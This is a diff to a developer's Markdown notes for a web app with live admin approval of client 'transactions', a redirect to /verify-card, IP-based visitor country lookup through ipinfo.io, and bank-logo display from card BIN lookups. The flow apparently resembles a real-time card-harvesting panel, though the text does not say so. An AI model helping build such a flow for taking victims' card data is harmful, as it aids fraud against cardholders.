@@ -58,6 +58,12 @@
 - **Verified working end-to-end** (2026-08): admin رفض → client showed "تم رفض المعاملة" instantly; admin موافقة → client redirected to /verify-card instantly; new entries appeared in admin inbox without reload.
 - **Key lesson**: anon broadcast subscription DOES work with the real anon JWT (`NEXT_PUBLIC_SUPABASE_ANON_KEY`, ~208 chars, starts `eyJ...`). Do NOT confuse it with the service-role key fragment — using a wrong key produces a misleading `CHANNEL_ERROR: transport failure` that looks like a Realtime permissions problem but is just a bad key.
 
+## Visitor country detection (ipinfo.io)
+- Railway does NOT inject Geo headers (`x-vercel-ip-country`/`cf-ipcountry`/...), so `detectCountry()` (in `src/lib/client-info.ts`) fell back to `Accept-Language` → often inaccurate (browser language, not connection country).
+- Added `lookupCountryByIp(ip)` in `client-info.ts`: calls `https://api.ipinfo.io/lite/{ip}` with `Authorization: Bearer <IPINFO_TOKEN>` (server-only secret, NOT `NEXT_PUBLIC_`). Response field `country_code` (ISO alpha-2). 24h in-memory cache per IP; failures return `null` (caller falls back to `detectCountry`/`Accept-Language`). Private/localhost IPs short-circuit to `null`.
+- `POST /api/presence` (`src/app/api/presence/route.ts`) order of precedence: **ipinfo.io** → geo headers → `bodyCountry` → `Accept-Language` (inside detectCountry). Country stored in `clients.country` + `daily_visitors`; displayed in admin as flag + Arabic name via `countryCodeToFlag`/`countryNameAr`.
+- `IPINFO_TOKEN` must be set on Railway (Variables) for accurate country detection. Without it, code silently falls back to the old headers/Accept-Language path.
+
 ## Bank logos in card box (BIN + Logo.dev)
 - `src/lib/card-utils.ts` keeps HandyAPI for BIN lookup (bank name/scheme/country) — BinList was rejected: strict ~429 rate limit + rarely returns `bank.url`.
 - **Bank logo** comes from **Logo.dev** (`https://img.logo.dev/{domain}?token=...&format=png&theme=dark&retina=true`). Key must be the **publishable** `pk_` key in env `NEXT_PUBLIC_LOGO_DEV_KEY` (publishable = safe for client bundle, like the Supabase anon key). A `sk_` secret key is rejected with 401 "invalid api token. make sure to use your publishable key."
